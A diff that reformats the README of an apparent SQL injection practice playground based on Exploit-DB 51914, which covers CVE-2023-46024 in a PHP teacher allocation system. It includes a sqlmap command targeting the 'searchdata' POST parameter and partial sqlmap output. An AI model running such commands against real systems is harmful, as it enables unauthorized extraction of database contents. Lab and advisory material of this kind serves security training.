@@ -2,18 +2,17 @@
 This SQLi Playground comes from the exploit located at https://www.exploit-db.com/exploits/51914
 
 # Exploit Content
-## Exploit Title: Teacher Subject Allocation Management System 1.0 - 'searchdata' SQLi
-## Date: 2023-11-15
-## Exploit Author: Ersin Erenler
-## Vendor Homepage: https://phpgurukul.com/teacher-subject-allocation-system-using-php-and-mysql
-## Software Link: https://phpgurukul.com/?sdm_process_download=1&download_id=17645
-## Version: 1.0
-## Tested on: Windows/Linux, Apache 2.4.54, PHP 8.2.0
-## CVE : CVE-2023-46024
 
+Exploit Title: Teacher Subject Allocation Management System 1.0 - 'searchdata' SQLi
+Date: 2023-11-15
+Exploit Author: Ersin Erenler
+Vendor Homepage: https://phpgurukul.com/teacher-subject-allocation-system-using-php-and-mysql
+Software Link: https://phpgurukul.com/?sdm_process_download=1&download_id=17645
+Version: 1.0
+Tested on: Windows/Linux, Apache 2.4.54, PHP 8.2.0
+CVE : CVE-2023-46024
 -------------------------------------------------------------------------------
-
-## Description:
+Description:
 
 Teacher Subject Allocation Management System V1.0 is susceptible to a significant security vulnerability that arises from insufficient protection on the 'searchdata' parameter in the index.php file. This flaw can potentially be exploited to inject malicious SQL queries, leading to unauthorized access and extraction of sensitive information from the database.
 
@@ -21,7 +20,7 @@ Vulnerable File: /index.php
 
 Parameter Name: searchdata
 
-## Proof of Concept:
+Proof of Concept:
 ----------------------
 
 Execute sqlmap using either the 'searchdata' parameter to retrieve the current database:
@@ -30,7 +29,6 @@ sqlmap -u "http://localhost/Tsas" --method POST --data "searchdata=test&search="
 
 SQLMap Response:
 ----------------------
----
 Parameter: searchdata (POST)
     Type: boolean-based blind
     Title: AND boolean-based blind - WHERE or HAVING clause
